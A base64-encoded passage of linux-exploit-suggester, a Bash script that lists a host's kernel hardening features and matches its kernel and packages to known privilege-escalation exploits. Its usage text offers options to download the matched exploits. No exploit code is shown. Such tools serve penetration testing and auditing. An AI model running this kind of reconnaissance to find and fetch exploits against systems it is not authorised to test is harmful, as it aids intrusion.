WygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IEFsbG9jYXRvciB2YWxpZGF0aW9uIGNoZWNraW5nCmF2YWlsYWJsZTogQ09ORklHX1NMVUJfREVCVUdfT049eSxjbWQ6ISBncmVwICdzbHViX2RlYnVnPS0nIC9wcm9jL2NtZGxpbmUKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zbHViX2RlYnVnLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBWaXJ0dWFsbHktbWFwcGVkIGtlcm5lbCBzdGFja3Mgd2l0aCBndWFyZCBwYWdlcwphdmFpbGFibGU6IENPTkZJR19WTUFQX1NUQUNLPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy92bWFwX3N0YWNrLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBQYWdlcyBwb2lzb25pbmcgYWZ0ZXIgZnJlZV9wYWdlcygpIGNhbGwKYXZhaWxhYmxlOiBDT05GSUdfUEFHRV9QT0lTT05JTkc9eQplbmFibGVkOiBjbWQ6IGdyZXAgJ3BhZ2VfcG9pc29uPTEnIC9wcm9jL2NtZGxpbmUKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9wYWdlX3BvaXNvbmluZy5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogVXNpbmcgJ3JlZmNvdW50X3QnIGluc3RlYWQgb2YgJ2F0b21pY190JwphdmFpbGFibGU6IENPTkZJR19SRUZDT1VOVF9GVUxMPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9yZWZjb3VudF9mdWxsLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBIYXJkZW5pbmcgY29tbW9uIHN0ci9tZW0gZnVuY3Rpb25zIGFnYWluc3QgYnVmZmVyIG92ZXJmbG93cwphdmFpbGFibGU6IENPTkZJR19GT1JUSUZZX1NPVVJDRT15CmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvZm9ydGlmeV9zb3VyY2UubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFJlc3RyaWN0IC9kZXYvbWVtIGFjY2VzcwphdmFpbGFibGU6IENPTkZJR19TVFJJQ1RfREVWTUVNPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9zdHJpY3RfZGV2bWVtLm1kCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBSZXN0cmljdCBJL08gYWNjZXNzIHRvIC9kZXYvbWVtCmF2YWlsYWJsZTogQ09ORklHX0lPX1NUUklDVF9ERVZNRU09eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2lvX3N0cmljdF9kZXZtZW0ubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCnNlY3Rpb246IEhhcmR3YXJlLWJhc2VkIHByb3RlY3Rpb24gZmVhdHVyZXM6CkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBTdXBlcnZpc29yIE1vZGUgRXhlY3V0aW9uIFByb3RlY3Rpb24gKFNNRVApIHN1cHBvcnQKYXZhaWxhYmxlOiB2ZXI+PTMuMAplbmFibGVkOiBjbWQ6Z3JlcCAtcWkgc21lcCAvcHJvYy9jcHVpbmZvCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvc21lcC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU3VwZXJ2aXNvciBNb2RlIEFjY2VzcyBQcmV2ZW50aW9uIChTTUFQKSBzdXBwb3J0CmF2YWlsYWJsZTogdmVyPj0zLjcKZW5hYmxlZDogY21kOmdyZXAgLXFpIHNtYXAgL3Byb2MvY3B1aW5mbwphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3NtYXAubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCnNlY3Rpb246IDNyZCBwYXJ0eSBrZXJuZWwgcHJvdGVjdGlvbiBtZWNoYW5pc21zOgpFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogR3JzZWN1cml0eQphdmFpbGFibGU6IENPTkZJR19HUktFUk5TRUM9eQplbmFibGVkOiBjbWQ6dGVzdCAtYyAvZGV2L2dyc2VjCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBQYVgKYXZhaWxhYmxlOiBDT05GSUdfUEFYPXkKZW5hYmxlZDogY21kOnRlc3QgLXggL3NiaW4vcGF4Y3RsCkVPRgopCgpGRUFUVVJFU1soKG4rKykpXT0kKGNhdCA8PEVPRgpmZWF0dXJlOiBMaW51eCBLZXJuZWwgUnVudGltZSBHdWFyZCAoTEtSRykga2VybmVsIG1vZHVsZQplbmFibGVkOiBjbWQ6dGVzdCAtZCAvcHJvYy9zeXMvbGtyZwphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2xrcmcubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCnNlY3Rpb246IEF0dGFjayBTdXJmYWNlOgpFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogVXNlciBuYW1lc3BhY2VzIGZvciB1bnByaXZpbGVnZWQgYWNjb3VudHMKYXZhaWxhYmxlOiBDT05GSUdfVVNFUl9OUz15CmVuYWJsZWQ6IHN5c2N0bDprZXJuZWwudW5wcml2aWxlZ2VkX3VzZXJuc19jbG9uZT09MQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL3VzZXJfbnMubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFVucHJpdmlsZWdlZCBhY2Nlc3MgdG8gYnBmKCkgc3lzdGVtIGNhbGwKYXZhaWxhYmxlOiBDT05GSUdfQlBGX1NZU0NBTEw9eQplbmFibGVkOiBzeXNjdGw6a2VybmVsLnVucHJpdmlsZWdlZF9icGZfZGlzYWJsZWQhPTEKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9icGZfc3lzY2FsbC5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU3lzY2FsbHMgZmlsdGVyaW5nCmF2YWlsYWJsZTogQ09ORklHX1NFQ0NPTVA9eQplbmFibGVkOiBjbWQ6Z3JlcCAtaXcgU2VjY29tcCAvcHJvYy9zZWxmL3N0YXR1cyB8IGF3ayAne3ByaW50IFwkMn0nCmFuYWx5c2lzLXVybDogaHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xlcy1yZXMvYmxvYi9tYXN0ZXIvZmVhdHVyZXMvYnBmX3N5c2NhbGwubWQKRU9GCikKCkZFQVRVUkVTWygobisrKSldPSQoY2F0IDw8RU9GCmZlYXR1cmU6IFN1cHBvcnQgZm9yIC9kZXYvbWVtIGFjY2VzcwphdmFpbGFibGU6IENPTkZJR19ERVZNRU09eQphbmFseXNpcy11cmw6IGh0dHBzOi8vZ2l0aHViLmNvbS9temV0LS9sZXMtcmVzL2Jsb2IvbWFzdGVyL2ZlYXR1cmVzL2Rldm1lbS5tZApFT0YKKQoKRkVBVFVSRVNbKChuKyspKV09JChjYXQgPDxFT0YKZmVhdHVyZTogU3VwcG9ydCBmb3IgL2Rldi9rbWVtIGFjY2VzcwphdmFpbGFibGU6IENPTkZJR19ERVZLTUVNPXkKYW5hbHlzaXMtdXJsOiBodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGVzLXJlcy9ibG9iL21hc3Rlci9mZWF0dXJlcy9kZXZrbWVtLm1kCkVPRgopCgoKdmVyc2lvbigpIHsKICAgIGVjaG8gImxpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyICIkVkVSU0lPTiIsIG16ZXQsIGh0dHBzOi8vei1sYWJzLmV1LCBNYXJjaCAyMDE5Igp9Cgp1c2FnZSgpIHsKICAgIGVjaG8gIkxFUyB2ZXIuICRWRVJTSU9OIChodHRwczovL2dpdGh1Yi5jb20vbXpldC0vbGludXgtZXhwbG9pdC1zdWdnZXN0ZXIpIGJ5IEBfbXpldF8iCiAgICBlY2hvCiAgICBlY2hvICJVc2FnZTogbGludXgtZXhwbG9pdC1zdWdnZXN0ZXIuc2ggW09QVElPTlNdIgogICAgZWNobwogICAgZWNobyAiIC1WIHwgLS12ZXJzaW9uICAgICAgICAgICAgICAgLSBwcmludCB2ZXJzaW9uIG9mIHRoaXMgc2NyaXB0IgogICAgZWNobyAiIC1oIHwgLS1oZWxwICAgICAgICAgICAgICAgICAgLSBwcmludCB0aGlzIGhlbHAiCiAgICBlY2hvICIgLWsgfCAtLWtlcm5lbCA8dmVyc2lvbj4gICAgICAtIHByb3ZpZGUga2VybmVsIHZlcnNpb24iCiAgICBlY2hvICIgLXUgfCAtLXVuYW1lIDxzdHJpbmc+ICAgICAgICAtIHByb3ZpZGUgJ3VuYW1lIC1hJyBzdHJpbmciCiAgICBlY2hvICIgLS1za2lwLW1vcmUtY2hlY2tzICAgICAgICAgICAtIGRvIG5vdCBwZXJmb3JtIGFkZGl0aW9uYWwgY2hlY2tzIChrZXJuZWwgY29uZmlnLCBzeXNjdGwpIHRvIGRldGVybWluZSBpZiBleHBsb2l0IGlzIGFwcGxpY2FibGUiCiAgICBlY2hvICIgLS1za2lwLXBrZy12ZXJzaW9ucyAgICAgICAgICAtIHNraXAgY2hlY2tpbmcgZm9yIGV4YWN0IHVzZXJzcGFjZSBwYWNrYWdlIHZlcnNpb24gKGhlbHBzIHRvIGF2b2lkIGZhbHNlIG5lZ2F0aXZlcykiCiAgICBlY2hvICIgLXAgfCAtLXBrZ2xpc3QtZmlsZSA8ZmlsZT4gICAtIHByb3ZpZGUgZmlsZSB3aXRoICdkcGtnIC1sJyBvciAncnBtIC1xYScgY29tbWFuZCBvdXRwdXQiCiAgICBlY2hvICIgLS1jdmVsaXN0LWZpbGUgPGZpbGU+ICAgICAgICAtIHByb3ZpZGUgZmlsZSB3aXRoIExpbnV4IGtlcm5lbCBDVkVzIGxpc3QiCiAgICBlY2hvICIgLS1jaGVja3NlYyAgICAgICAgICAgICAgICAgICAtIGxpc3Qgc2VjdXJpdHkgcmVsYXRlZCBmZWF0dXJlcyBmb3IgeW91ciBIVy9rZXJuZWwiCiAgICBlY2hvICIgLXMgfCAtLWZldGNoLXNvdXJjZXMgICAgICAgICAtIGF1dG9tYXRpY2FsbHkgZG93bmxvYWRzIHNvdXJjZSBmb3IgbWF0Y2hlZCBleHBsb2l0IgogICAgZWNobyAiIC1iIHwgLS1mZXRjaC1iaW5hcmllcyAgICAgICAgLSBhdXRvbWF0aWNhbGx5IGRvd25sb2FkcyBiaW5hcnkgZm9yIG1hdGNoZWQgZXhwbG9pdCBpZiBhdmFpbGFibGUiCiAgICBlY2hvICIgLWYgfCAtLWZ1bGwgICAgICAgICAgICAgICAgICAtIHNob3cgZnVsbCBpbmZvIGFib3V0IG1hdGNoZWQgZXhwbG9pdCIKICAgIGVjaG8gIiAtZyB8IC0tc2hvcnQgICAgICAgICAgICAgICAgIC0gc2hvdyBzaG9ydGVuIGluZm8gYWJvdXQgbWF0Y2hlZCBleHBsb2l0IgogICAgZWNobyAiIC0ta2VybmVsc3BhY2Utb25seSAgICAgICAgICAgLSBzaG93IG9ubHkga2VybmVsIHZ1bG5lcmFiaWxpdGllcyIKICAgIGVjaG8gIiAtLXVzZXJzcGFjZS1vbmx5ICAgICAgICAgICAgIC0gc2hvdyBvbmx5IHVzZXJzcGFjZSB2dWxuZXJhYmlsaXRpZXMiCiAgICBlY2hvICIgLWQgfCAtLXNob3ctZG9zICAgICAgICAgICAgICAtIHNob3cgYWxzbyBEb1NlcyBpbiByZXN1bHRzIgp9CgpleGl0V2l0aEVyck1zZygpIHsKICAgIGVjaG8gIiQxIiAxPiYyCiAgICBleGl0IDEKfQoKIyBleHRyYWN0cyBhbGwgaW5mb3JtYXRpb24gZnJvbSBvdXRwdXQgb2YgJ3VuYW1lIC1hJyBjb21tYW5kCnBhcnNlVW5hbWUoKSB7CiAgICBsb2NhbCB1bmFtZT0kMQoKICAgIEtFUk5FTD0kKGVjaG8gIiR1bmFtZSIgfCBhd2sgJ3twcmludCAkM30nIHwgY3V0IC1kICctJyAtZiAxKQogICAgS0VSTkVMX0FMTD0kKGVjaG8gIiR1bmFtZSIgfCBhd2sgJ3twcmludCAkM30nKQogICAgQVJDSD0kKGVjaG8gIiR1bmFtZSIgfCBhd2sgJ3twcmludCAkKE5GLTEpfScpCgogICAgT1M9IiIKICAgIGVjaG8gIiR1bmFtZSIgfCBncmVwIC1xIC1pICdkZWInICYmIE9TPSJkZWJpYW4iCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAndWJ1bnR1JyAmJiBPUz0idWJ1bnR1IgogICAgZWNobyAiJHVuYW1lIiB8IGdyZXAgLXEgLWkgJ1wtQVJDSCcgJiYgT1M9ImFyY2giCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAnXC1kZWVwaW4nICYmIE9TPSJkZWVwaW4iCiAgICBlY2hvICIkdW5hbWUiIHwgZ3JlcCAtcSAtaSAnXC1NQU5KQVJPJyAmJiBPUz0ibWFuamFybyIKICAgIGVjaG8gIiR1bmFtZSIgfCBncmVwIC1xIC1pICdcLmZjJyAmJiBPUz0iZmVkb3JhIgogICAgZWNobyAiJHVuYW1lIiB8IGdyZXAgLXEgLWkgJ1wuZWwnICYmIE9TPSJSSEVMIgogICAgZWNobyAiJHVuYW1lIiB8IGdyZXAgLXEgLWkgJ1wubWdhJyAmJiBPUz0ibWFnZWlhIgoKICAgICMgJ3VuYW1lIC1hJyBvdXRwdXQgZG9lc24ndCBjb250YWluIGRpc3RyaWJ1dGlvbiBudW1iZXIgKGF0IGxlYXN0IG5vdCBpbiBjYXNlIG9mIGFsbCBkaXN0cm9zKQp9CgpnZXRQa2dMaXN0KCkgewogICAgbG9jYWwgZGlzdHJvPSQxCiAgICBsb2NhbCBwa2dsaXN0X2ZpbGU9JDIKICAgIAogICAgIyB0YWtlIHBhY2thZ2UgbGlzdGluZyBmcm9tIHByb3ZpZGVkIGZpbGUgJiBkZXRlY3QgaWYgaXQncyAncnBtIC1xYScgbGlzdGluZyBvciAnZHBrZyAtbCcgb3IgJ3BhY21hbiAtUScgbGlzdGluZyBvZiBub3QgcmVjb2duaXplZCBsaXN0aW5nCiAgICBpZiBbICIkb3B0X3BrZ2xpc3RfZmlsZSIgPSAidHJ1ZSIgLWEgLWUgIiRwa2dsaXN0X2ZpbGUiIF07IHRoZW4KCiAgICAgICAgIyB1YnVudHUvZGViaWFuIHBhY2thZ2UgbGlzdGluZyBmaWxlCiAgICAgICAgaWYgWyAkKGhlYWQgLTEgIiRwa2dsaXN0X2ZpbGUiIHwgZ3JlcCAnRGVzaXJlZD1Vbmtub3duL0luc3RhbGwvUmVtb3ZlL1B1cmdlL0hvbGQnKSBdOyB0aGVuCiAgICAgICAgICAgIFBLR19MSVNUPSQoY2F0ICIkcGtnbGlzdF9maWxlIiB8IGF3ayAne3ByaW50ICQyIi0iJDN9JyB8IHNlZCAncy86YW1kNjQvL2cnKQoKICAgICAgICAgICAgT1M9ImRlYmlhbiIKICAgICAgICAgICAgWyAiJChncmVwIHVidW50dSAiJHBrZ2xpc3RfZmlsZSIpIiBdICYmIE9TPSJ1YnVudHUiCiAgICAgICAgIyByZWRoYXQgcGFja2FnZSBsaXN0aW5nIGZpbGUKICAgICAgICBlbGlmIFsgIiQoZ3JlcCAtRSAnXC5lbFsxLTldK1tcLl9dJyAiJHBrZ2xpc3RfZmlsZSIgfCBoZWFkIC0xKSIgXTsgdGhlbgogICAgICAgICAgICBQS0dfTElTVD0kKGNhdCAiJHBrZ2xpc3RfZmlsZSIpCiAgICAgICAgICAgIE9TPSJSSEVMIgogICAgICAgICMgZmVkb3JhIHBhY2thZ2UgbGlzdGluZyBmaWxlCiAgICAgICAgZWxpZiBbICIkKGdyZXAgLUUgJ1wuZmNbMS05XSsnaSAiJHBrZ2xpc3RfZmlsZSIgfCBoZWFkIC0xKSIgXTsgdGhlbgogICAgICAgICAgICBQS0dfTElTVD0kKGNhdCAiJHBrZ2xpc3RfZmlsZSIpCiAgICAgICAgICAgIE9TPSJmZWRvcmEiCiAgICAgICAgIyBtYWdlaWEgcGFja2FnZSBsaXN0aW5nIGZpbGUKICAgICAgICBlbGlmIFsgIiQoZ3JlcCAtRSAnXC5tZ2FbMS05XSsnICIkcGtnbGlzdF9maWxlIiB8IGhlYWQgLTEpIiBdOyB0aGVuCiAgICAgICAgICAgIFBLR19MSVNUPSQoY2F0ICIkcGtnbGlzdF9maWxlIikKICAgICAgICAgICAgT1M9Im1hZ2VpYSIKICAgICAgICAjIHBhY21hbiBwYWNrYWdlIGxpc3RpbmcgZmlsZQogICAgICAgIGVsaWYgWyAiJChncmVwIC1FICdcIFswLTldK1wuJyAiJHBrZ2xpc3RfZmlsZSIgfCBoZWFkIC0xKSIgXTsgdGhlbgogICAgICAgICAgICBQS0dfTElTVD0kKGNhdCAiJHBrZ2xpc3RfZmlsZSIgfCBhd2sgJ3twcmludCAkMSItIiQyfScpCiAgICAgICAgICAgIE9TPSJhcmNoIgogICAgICAgICMgZmlsZSBub3QgcmVjb2duaXplZCAtIHNraXBwaW5nCiAgICAgICAgZWxzZQogICAgICAgICAgICBQS0dfTElTVD0iIgogICAgICAgIGZpCgogICAgZWxpZiBbICIkZGlzdHJvIiA9ICJkZWJpYW4iIC1vICIkZGlzdHJvIiA9ICJ1YnVudHUiIC1vICIkZGlzdHJvIiA9ICJkZWVwaW4iIF07IHRoZW4KICAgICAgICBQS0dfTElTVD0kKGRwa2cgLWwgfCBhd2sgJ3twcmludCAkMiItIiQzfScgfCBzZWQgJ3MvOmFtZDY0Ly9nJykKICAgIGVsaWYgWyAiJGRpc3RybyIgPSAiUkhFTCIgLW8gIiRkaXN0cm8iID0gImZlZG9yYSIgLW8gIiRkaXN0cm8iID0gIm1hZ2VpYSIgXTsgdGhlbgogICAgICAgIFBLR19MSVNUPSQocnBtIC1xYSkKICAgIGVsaWYgWyAiJGRpc3RybyIgPSAiYXJjaCIgLW8gIiRkaXN0cm8iID0gIm1hbmphcm8iIF07IHRoZW4KICAgICAgICBQS0dfTElTVD0kKHBhY21hbiAtUSB8IGF3ayAne3ByaW50ICQxIi0iJDJ9JykKICAgIGVsaWYgWyAteCAvdXNyL2Jpbi9lcXVlcnkgXTsgdGhlbgogICAgICAgIFBLR19MSVNUPSQoL3Vzci9iaW4vZXF1ZXJ5IC0tcXVpZXQgbGlzdCAnKicgLUYgJyRuYW1lOiR2ZXJzaW9uJyB8IGN1dCAtZC8gLWYyLSB8IGF3ayAne3ByaW50ICQxIjoiJDJ9JykKICAgIGVsc2UKICAgICAgICAjIHBhY2thZ2VzIGxpc3Rpbmcgbm90IGF2YWlsYWJsZQogICAgICAgIFBLR19MSVNUPSIiCiAgICBmaQp9CgojIGZyb206IGh0dHBzOi8vc3RhY2tvdmVyZmxvdy5jb20vcXVlc3Rpb25zLzQwMjM4MzAvaG93LWNvbXBhcmUtdHdvLXN0cmluZ3MtaW4tZG90LXNlcGFyYXRlZC12ZXJzaW9uLWZvcm1hdC1pbi1iYXNoCnZlckNvbXBhcmlzaW9uKCkgewoKICAgIGlmIFtbICQxID09ICQyIF1dCiAgICB0aGVuCiAgICAgICAgcmV0dXJuIDAKICAgIGZpCgogICAgbG9jYWwgSUZTPS4KICAgIGxvY2FsIGkgdmVyMT0oJDEpIHZlcjI9KCQyKQoKICAgICMgZmlsbCBlbXB0eSBmaWVsZHMgaW4gdmVyMSB3aXRoIHplcm9zCiAgICBmb3IgKChpPSR7I3ZlcjFbQF19OyBpPCR7I3ZlcjJbQF19OyBpKyspKQogICAgZG8KICAgICAgICB2ZXIxW2ldPTAKICAgIGRvbmUKCiAgICBmb3IgKChpPTA7IGk8JHsjdmVyMVtAXX07IGkrKykpCiAgICBkbwogICAgICAgIGlmIFtbIC16ICR7dmVyMltpXX0gXV0KICAgICAgICB0aGVuCiAgICAgICAgICAgICMgZmlsbCBlbXB0eSBmaWVsZHMgaW4gdmVyMiB3aXRoIHplcm9zCiAgICAgICAgICAgIHZlcjJbaV09MAogICAgICAgIGZpCiAgICAgICAgaWYgKCgxMCMke3ZlcjFbaV19ID4gMTAjJHt2ZXIyW2ldfSkpCiAgICAgICAgdGhlbgogICAgICAgICAgICByZXR1cm4gMQogICAgICAgIGZpCiAgICAgICAgaWYgKCgxMCMke3ZlcjFbaV19IDwgMTAjJHt2ZXIyW2ldfSkpCiAgICAgICAgdGhlbgogICAgICAgICAgICByZXR1cm4gMgogICAgICAgIGZpCiAgICBkb25lCgogICAgcmV0dXJuIDAKfQoKZG9WZXJzaW9uQ29tcGFyaXNpb24oKSB7CiAgICBsb2NhbCByZXFWZXJzaW9uPSIkMSIKICAgIGxvY2FsIHJlcVJlbGF0aW9uPSIkMiIKICAgIGxvY2FsIGN1cnJlbnRWZXJzaW9uPSIkMyIKCiAgICB2ZXJDb21wYXJpc2lvbiAkY3VycmVudFZlcnNpb24gJHJlcVZlcnNpb24KICAgIGNhc2UgJD8gaW4KICAgICAgICAwKSBjdXJyZW50UmVsYXRpb249Jz0nOzsKICAgICAgICAxKSBjdXJyZW50UmVsYXRpb249Jz4nOzsKICAgICAgICAyKSBjdXJyZW50UmVsYXRpb249JzwnOzsKICAgIGVzYWMKCiAgICBpZiBbICIkcmVxUmVsYXRpb24iID09ICI9IiBdOyB0aGVuCiAgICAgICAgWyAkY3VycmVudFJlbGF0aW9uID09ICI9IiBdICYmIHJldHVybiAwCiAgICBlbGlmIFsgIiRyZXFSZWxhdGlvbiIgPT0gIj4iIF07IHRoZW4KICAgICAgICBbICRjdXJyZW50UmVsYXRpb24gPT0gIj4iIF0gJiYgcmV0dXJuIDAKICAgIGVsaWYgWyAiJHJlcVJlbGF0aW9uIiA9PSAiPCIgXTsgdGhlbgogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPCIgXSAmJiByZXR1cm4gMAogICAgZWxpZiBbICIkcmVxUmVsYXRpb24iID09ICI+PSIgXTsgdGhlbgogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPSIgXSAmJiByZXR1cm4gMAogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPiIgXSAmJiByZXR1cm4gMAogICAgZWxpZiBbICIkcmVxUmVsYXRpb24iID09ICI8PSIgXTsgdGhlbgogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPSIgXSAmJiByZXR1cm4gMAogICAgICAgIFsgJGN1cnJlbnRSZWxhdGlvbiA9PSAiPCIgXSAmJiByZXR1cm4gMAogICAgZmkKfQoKY29tcGFyZVZhbHVlcygpIHsKICAgIGN1clZhbD0kMQogICAgdmFsPSQyCiAgICBzaWduPSQzCgogICAgaWYgWyAiJHNpZ24iID09ICI9PSIgXTsgdGhlbgogICAgICAgIFsgIiR2YWwiID09ICIkY3VyVmFsIiBdICYmIHJldHVybiAwCiAgICBlbGlmIFsgIiRzaWduIiA9PSAiIT0iIF07IHRoZW4KICAgICAgICBbICIkdmFsIiAhPSAiJGN1clZhbCIgXSAmJiByZXR1cm4gMAogICAgZmkKCiAgICByZXR1cm4gMQp9CgpjaGVja1JlcXVpcmVtZW50KCkgewogICAgI2VjaG8gIkNoZWNraW5nIHJlcXVpcmVtZW50OiAkMSIKICAgIGxvY2FsIElOPSIkMSIKICAgIGxvY2FsIHBrZ05hbWU9IiR7Mjo0fSIKCiAgICBpZiBbWyAiJElOIiA9fiBecGtnPS4qJCBdXTsgdGhlbgoKICAgICAgICAjIGFsd2F5cyB0cnVlIGZvciBMaW51eCBPUwogICAgICAgIFsgJHtwa2dOYW1lfSA9PSAibGludXgta2VybmVsIiBdICYmIHJldHVybiAwCgogICAgICAgICMgdmVyaWZ5IGlmIHBhY2thZ2UgaXMgcHJlc2VudCAKICAgICAgICBwa2c9JChlY2hvICIkUEtHX0xJU1QiIHwgZ3JlcCAtRSAtaSAiXiRwa2dOYW1lLVswLTldKyIgfCBoZWFkIC0xKQogICAgICAgIGlmIFsgLW4gIiRwa2ciIF07IHRoZW4KICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICBmaQoKICAgIGVsaWYgW1sgIiRJTiIgPX4gXnZlci4qJCBdXTsgdGhlbgogICAgICAgIHZlcnNpb249IiR7SU4vL1teMC05Ll0vfSIKICAgICAgICByZXN0PSIke0lOI3Zlcn0iCiAgICAgICAgb3BlcmF0b3I9JHtyZXN0JSR2ZXJzaW9ufQoKICAgICAgICBpZiBbICIkcGtnTmFtZSIgPT0gImxpbnV4LWtlcm5lbCIgLW8gIiRvcHRfY2hlY2tzZWNfbW9kZSIgPT0gInRydWUiIF07IHRoZW4KCiAgICAgICAgICAgICMgZm9yIC0tY3ZlbGlzdC1maWxlIG1vZGUgc2tpcCBrZXJuZWwgdmVyc2lvbiBjb21wYXJpc2lvbgogICAgICAgICAgICBbICIkb3B0X2N2ZWxpc3RfZmlsZSIgPSAidHJ1ZSIgXSAmJiByZXR1cm4gMAoKICAgICAgICAgICAgZG9WZXJzaW9uQ29tcGFyaXNpb24gJHZlcnNpb24gJG9wZXJhdG9yICRLRVJORUwgJiYgcmV0dXJuIDAKICAgICAgICBlbHNlCiAgICAgICAgICAgICMgZXh0cmFjdCBwYWNrYWdlIHZlcnNpb24gYW5kIGNoZWNrIGlmIHJlcXVpcmVtbnQgaXMgdHJ1ZQogICAgICAgICAgICBwa2c9JChlY2hvICIkUEtHX0xJU1QiIHwgZ3JlcCAtRSAtaSAiXiRwa2dOYW1lLVswLTldKyIgfCBoZWFkIC0xKQoKICAgICAgICAgICAgIyBza2lwIChpZiBydW4gd2l0aCAtLXNraXAtcGtnLXZlcnNpb25zKSB2ZXJzaW9uIGNoZWNraW5nIGlmIHBhY2thZ2Ugd2l0aCBnaXZlbiBuYW1lIGlzIGluc3RhbGxlZAogICAgICAgICAgICBbICIkb3B0X3NraXBfcGtnX3ZlcnNpb25zIiA9ICJ0cnVlIiAtYSAtbiAiJHBrZyIgXSAmJiByZXR1cm4gMAoKICAgICAgICAgICAgIyB2ZXJzaW9uaW5nOgogICAgICAgICAgICAjZWNobyAicGtnOiAkcGtnIgogICAgICAgICAgICBwa2dWZXJzaW9uPSQoZWNobyAiJHBrZyIgfCBncmVwIC1FIC1pIC1vIC1lICctW1wuMC05XCs6cF0rWy1cK10nIHwgY3V0IC1kJzonIC1mMiB8IHNlZCAncy9bXCstXS8vZycgfCBzZWQgJ3MvcFswLTldLy9nJykKICAgICAgICAgICAgI2VjaG8gInZlcnNpb246ICRwa2dWZXJzaW9uIgogICAgICAgICAgICAjZWNobyAib3BlcmF0b3I6ICRvcGVyYXRvciIKICAgICAgICAgICAgI2VjaG8gInJlcXVpcmVkIHZlcnNpb246ICR2ZXJzaW9uIgogICAgICAgICAgICAjZWNobwogICAgICAgICAgICBkb1ZlcnNpb25Db21wYXJpc2lvbiAkdmVyc2lvbiAkb3BlcmF0b3IgJHBrZ1ZlcnNpb24gJiYgcmV0dXJuIDAKICAgICAgICBmaQogICAgZWxpZiBbWyAiJElOIiA9fiBeeDg2XzY0JCBdXSAmJiBbICIkQVJDSCIgPT0gIng4Nl82NCIgLW8gIiRBUkNIIiA9PSAiIiBdOyB0aGVuCiAgICAgICAgcmV0dXJuIDAKICAgIGVsaWYgW1sgIiRJTiIgPX4gXng4NiQgXV0gJiYgWyAiJEFSQ0giID09ICJpMzg2IiAtbyAiJEFSQ0giID09ICJpNjg2IiAtbyAiJEFSQ0giID09ICIiIF07IHRoZW4KICAgICAgICByZXR1cm4gMAogICAgZWxpZiBbWyAiJElOIiA9fiBeQ09ORklHXy4qJCBdXTsgdGhlbgoKICAgICAgICAjIHNraXAgaWYgY2hlY2sgaXMgbm90IGFwcGxpY2